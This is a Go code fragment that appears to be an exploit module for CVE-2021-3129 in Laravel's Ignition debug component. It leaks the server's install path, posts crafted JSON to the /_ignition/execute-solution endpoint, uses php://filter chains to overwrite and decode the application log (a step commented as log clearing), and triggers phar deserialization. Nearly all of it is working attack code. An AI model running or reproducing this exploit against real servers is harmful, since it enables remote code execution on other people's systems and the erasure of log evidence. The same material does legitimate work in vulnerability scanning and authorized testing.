	path := func(url string) string {
		if resp, err := httpclient.SimpleGet(url + "/_ignition/execute-solution"); err == nil {
			regx := regexp.MustCompile(`(\#\d*\ (.*)(?:\/|\\)vendor)`)
			res := regx.FindStringSubmatch(resp.RawBody)
			if len(res) != 0 {
				return res[2]
			} else {
				return ".."
			}
		} else {
			return ".."
		}
	}

	payloadSend := func(url *httpclient.FixUrl, pay string) (int, string, error) {
		payload := `{
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": "%s"
            }
        }`
		cfg := httpclient.NewPostRequestConfig("/_ignition/execute-solution")
		cfg.Header.Store("Accept", "application/json")
		cfg.Header.Store("Content-Type", "application/json")
		cfg.VerifyTls = false
		cfg.Data = fmt.Sprintf(payload, pay)
		resp, err := httpclient.DoHttpRequest(url, cfg)
		return resp.StatusCode, resp.RawBody, err
	}

	//覆盖清除日志
	cleanLog := func(url *httpclient.FixUrl) (int, string, error) {
		payload := "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
		return payloadSend(url, payload)
	}

	decodeLog := func(url *httpclient.FixUrl) (int, string, error) {
		payload := "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
		return payloadSend(url, payload)
	}

	unserializeLog := func(url *httpclient.FixUrl, path string) (int, string, error) {
		var payload string
		if strings.Contains(path, ":") {
			payload = fmt.Sprintf("phar://%s\\storage\\logs\\laravel.log\\test.txt", path)
		} else {
			payload = fmt.Sprintf("phar://%s/storage/logs/laravel.log/test.txt", path)
		}
		return payloadSend(url, payload)
	}
